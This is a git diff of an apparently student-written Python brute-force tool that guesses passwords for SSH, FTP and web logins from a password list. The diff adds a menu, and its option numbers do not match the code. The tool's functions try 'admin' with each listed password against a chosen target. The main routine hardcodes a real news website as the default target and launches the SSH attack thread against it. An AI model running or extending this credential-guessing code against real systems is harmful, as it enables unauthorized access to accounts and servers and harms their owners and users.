@@ -1,3 +1,4 @@
+from sre_parse import State
 import paramiko, sys, os, socket
 import threading, time
 from pyparsing import Word
@@ -14,6 +15,7 @@ We got a password list and we try all of them on our target with user we set up 
 The main focus of the function is to get escalation to credentials by testing a lot of 
 common password options.
 '''
+
 class brute_force:
 
     def __init__(bf):
@@ -32,8 +34,8 @@ class brute_force:
         bf.passwords_bulk = "./Brute Force/passwords.txt"
         bf.single_password = ""
         bf.code = 0
+        bf.state = ""
         
-
     @staticmethod
     def entry_message():
         '''
@@ -50,6 +52,7 @@ class brute_force:
         console.print("#"*12,"Brute Force", "#"*12,style="dim cyan")
         console.print("#"*11,"Chooce who you want to attack", "#"*11,style="dim cyan")
         console.print("#"*11,"FTP / SSH / WEB", "#"*11,style="dim cyan")
+        console.print("")
         console.print("#" * 55, style="bold green")
         print()
         console.print("[+]For help press - H")
@@ -57,6 +60,11 @@ class brute_force:
         console.print("[+]For SSH Brute force - 2")
         console.print("[+]For FTP Brute force - 3")
         console.print("[+]For Web brute force - 4")
+        
+    def read_help(bf):
+        with open('./Brute Force/help.txt', encoding='utf8') as f:
+            for line in f:
+                print(line.strip())
 
     def ssh_connect(bf):
         '''
@@ -112,7 +120,7 @@ class brute_force:
                 bf.single_password = line.strip()
                 data_to_send = {"username" : "admin" , "password" : bf.single_password}
                 response = requests.post(bf.target,data=data_to_send)
-                print(response.content)
+               #print(response.content)
                 if "Login failed" not in str(response.content):
                     print("[+] Password found --->" + bf.single_password)
     def init_main(bf):
@@ -120,7 +128,33 @@ class brute_force:
         Here we init the function to run, we run the functions in order to the request of the user
         '''
         bf.entry_message()
-        bf.post()
+        #bf.post()
+        console.print("Please enter your wanted option from the menu:")
+        bf.state = input()
+
+        if(bf.state == 'h' or bf.state =='H'):
+            bf.read_help()
+            console.print("Press 'b' to back to the menu")
+            bf.state = input()
+            if(bf.state == 'b' or bf.state == 'B'):
+                bf.init_main()
+        elif(bf.state == '1'):
+            console.print("You chose SSH Brute Force")
+            console.print("Please enter your target(include 'http://') : ")
+            bf.target = input()
+            console.print("Please enter username to check with(recommendated - 'admin') :")
+            bf.username = input()
+            bf.ssh_thread()
+        elif(bf.state == '2'):
+            console.print("You chose HTTP Brute Force")
+            console.print("Please enter your target (include 'http://' and login page) : ")
+            bf.target = input()
+            console.print("Please enter username to check with(reccomendated - 'admin') :")
+            bf.username = input()
+            bf.post()
+
+
+        #bf.read_help()
         bf.username = "admin"
         bf.target = "http://www.ynet.co.il"
         bf.ssh_thread()
